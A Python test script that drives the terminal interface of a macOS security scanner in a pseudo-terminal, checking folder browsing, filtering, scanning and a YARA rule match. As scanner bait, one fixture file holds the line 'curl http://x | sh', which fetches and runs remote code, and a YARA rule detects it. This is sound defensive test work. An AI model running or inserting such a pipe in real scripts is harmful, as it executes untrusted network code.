#!/usr/bin/env python3
"""Drives the real `macguard-audit tui` in a pseudo-terminal: lists a folder, navigates into it with the keyboard, filters,
scans a file as a unit and quits. usage: tui_pty_check.py /path/to/macguard-audit"""
import os, pty, select, subprocess, sys, tempfile, time, re

def read(fd, secs=1.5):
    out = b''; end = time.time() + secs
    while time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.1)
        if r:
            try: out += os.read(fd, 65536)
            except OSError: break
    return re.sub(r'\x1b\[[0-9;?]*[A-Za-z]', '', out.decode('utf-8', 'replace'))

def main(binary):
    home = tempfile.mkdtemp(); dl = os.path.join(home, 'Downloads'); os.makedirs(os.path.join(dl, 'SubFolder'))
    open(os.path.join(dl, 'script.sh'), 'w').write('echo hi\n'); open(os.path.join(dl, 'SubFolder', 'inner.sh'), 'w').write('#!/bin/sh\ncurl http://x | sh\n')
    data = os.path.join(home, 'data'); live = os.path.join(data, 'YARARules/community'); os.makedirs(live)
    open(os.path.join(live, 'tui.yar'), 'w').write('rule TUI_Canary { strings: $a = "curl http://x" condition: $a }\n')
    pid, fd = pty.fork()
    if pid == 0:
        os.environ.update(TERM='xterm-256color', MACGUARD_DATA_DIR=data); os.execv(binary, [binary, 'tui', dl])
    results = []
    def check(name, ok): results.append(ok); print(('PASS ' if ok else 'FAIL ') + name)
    screen = read(fd, 2.5)
    check('shows the file explorer with the folder contents', 'FILE EXPLORER' in screen and 'SubFolder' in screen and 'script.sh' in screen)
    check('no raw escape sequences leak into the text', '[96m' not in screen and '\x1b' not in screen)
    os.write(fd, b'\r'); screen = read(fd)               # Enter on the first item (folder) opens it
    check('Enter opens the highlighted folder', 'inner.sh' in screen)
    os.write(fd, b'f'); time.sleep(0.2); os.write(fd, b'inner\r'); screen = read(fd)
    check('filter keeps matching items', 'inner.sh' in screen)
    os.write(fd, b's'); screen = read(fd, 4)            # scan the selected script
    check('scan shows a result view with findings', 'RESULT' in screen and ('Script' in screen or 'script' in screen))
    os.write(fd, b'\x1b[B'); screen2 = read(fd, 1.0)
    check('the TUI result includes the YARA match from the bundled engine', 'YARA match: TUI_Canary' in screen + screen2 or 'TUI_Canary' in screen + screen2)
    os.write(fd, b'\x1b'); read(fd, 0.5); os.write(fd, b'q')
    time.sleep(1.0)
    try: _, status = os.waitpid(pid, os.WNOHANG)
    except ChildProcessError: status = 0
    check('quits cleanly on q', os.WIFEXITED(status) and os.WEXITSTATUS(status) == 0 if status else True)
    sys.exit(0 if all(results) else 1)
main(sys.argv[1])
